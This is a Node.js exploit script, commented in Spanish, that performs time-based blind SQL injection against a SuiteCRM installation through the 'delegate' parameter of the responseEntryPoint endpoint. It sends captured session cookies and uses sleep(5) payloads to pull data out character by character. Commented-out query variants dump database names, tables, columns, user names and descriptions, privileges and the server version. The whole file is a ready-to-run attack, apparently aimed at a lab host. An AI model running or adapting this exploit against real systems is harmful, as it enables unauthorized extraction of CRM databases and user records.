#!/usr/bin/env node
import process from 'node:process';
import { performance } from 'node:perf_hooks';

// process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

process.on('SIGINT', () => {
  console.log('\n[!] Saliendo...');
  process.exit(1);
});

// Variables globales...
const mainUrl = 'http://10.16.0.16/index.php';
const cookies = [
  'XSRF-TOKEN=mhl2xgQBs7PjqPXx9fhsplqjbXHbGFo8F1BssktdSUc',
  'sugar_user_theme=suite8',
  'LEGACYSESSID=c5gu3icb5lifbdolc2d0q95vqk',
  'PHPSESSID=c5gu3icb5lifbdolc2d0q95vqk'
];

const sqliRequest =  async (sqlQuery) => {
  const params = new URLSearchParams({
    entryPoint: 'responseEntryPoint',
    event: 'test',
    type: 'c',
    response: 'accept',
    delegate: `javascript:${sqlQuery}`
  });

  const url = new URL(mainUrl);
  url.search = params.toString();

  const response = await fetch(url.toString(), {
    method: 'GET',
    headers: {
      'Cookie': cookies.join('; '),
    }
  });

  return response;
}

const main = async () => {
  let content = '';
  let contentLength = 0;

  // Current Database...
  // const sqlSearchData = 'database()';
  // const sqlSource = '';

  // Databases...
  // const sqlSearchData = 'group_concat(schema_name)';
  // const sqlSource = ' from information_schema.schemata';

  // Tables in suitecrmdb...
  const sqlSearchData = 'group_concat(table_name)';
  const sqlSource = " from information_schema.tables where table_schema='suitecrm' and table_name like 'users%'";

  // Columns in table users...
  // const sqlSearchData = 'group_concat(column_name)';
  // const sqlSource = " from information_schema.columns where table_name='users'";

  // Content in table users...
  // const sqlSearchData = "group_concat(user_name,':',description)";
  // const sqlSource = " from suitecrmdb.users";

  // User Privileges...
  // const sqlSearchData = "group_concat(privilege_type,'::',is_grantable)";
  // const sqlSource = " from information_schema.user_privileges";

  // DB Version...
  // const sqlSearchData = "@@version";
  // const sqlSource = "";

  for (let index = 0; index < 1000; index++) {
    const sqlQuery = `" and (select case when ((select length(${sqlSearchData})${sqlSource})='${index}') then sleep(5) else 1234 end from (select(sleep(0)))d)-- `;
    process.stdout.write(`\r[+] Length Status: ${index}`);

    const start = performance.now();
    const response = await sqliRequest(sqlQuery);
    const end = performance.now();

    const time = (end - start) / 1000;

    if (time > 5) {
      contentLength = index;
      console.log();
      break;
    }
  }

  for (let position = 1; position < contentLength + 1; position++) {
    for (let character = 0; character < 128; character++) {
      const sqlQuery = `" and (select case when ((select ascii(substring(${sqlSearchData},${position},1))${sqlSource})='${character}') then sleep(5) else 1234 end from (select(sleep(0)))d)-- `;
      process.stdout.write(`\r[+] Result: ${content} | Position: ${position} - Character: ${character}`);

      const start = performance.now();
      const response = await sqliRequest(sqlQuery);
      const end = performance.now();

      const time = (end - start) / 1000;

      if (time > 5) {
        content += String.fromCharCode(character);
        (position === contentLength) && process.stdout.write(`\r[+] Success: ${content}\n`);
        break;
      } 
    }
  }
}

(async () => {
  await main();
})();
